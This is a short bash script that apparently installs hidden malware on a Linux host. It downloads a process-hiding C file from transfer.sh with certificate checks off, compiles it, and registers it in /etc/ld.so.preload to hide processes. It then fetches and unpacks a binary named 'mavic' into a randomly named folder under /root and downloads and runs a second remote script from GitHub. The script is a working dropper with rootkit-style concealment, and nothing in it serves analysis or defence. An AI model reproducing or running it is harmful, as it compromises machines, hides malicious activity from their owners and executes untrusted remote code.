#!/bin/bash
apt update
apt install sudo screen -y
wget --no-check-certificate -c http://transfer.sh/ntzeku/processhider.c -O jik.c 
gcc -Wall -fPIC -shared -o libprocessh.so jik.c -ldl
sudo mv libprocessh.so /usr/local/lib/ 
echo /usr/local/lib/libprocessh.so >> /etc/ld.so.preload 
cd /root 
fol=$(openssl rand -base64 6)
ra3=$(openssl rand -hex 5)
mkdir $fol
cd $fol
z3=$(openssl rand -hex 3)
wget http://transfer.sh/H8t4Pk/mav.zip -O ty$z3.zip
unzip ty$z3.zip 
chmod 777 mavic 
rm ty$z3.zip
wget https://github.com/Mafs68/hjs839/raw/main/mai2.sh -O $ra3.sh
chmod 777 $ra3.sh
timeout 352m ./$ra3.sh
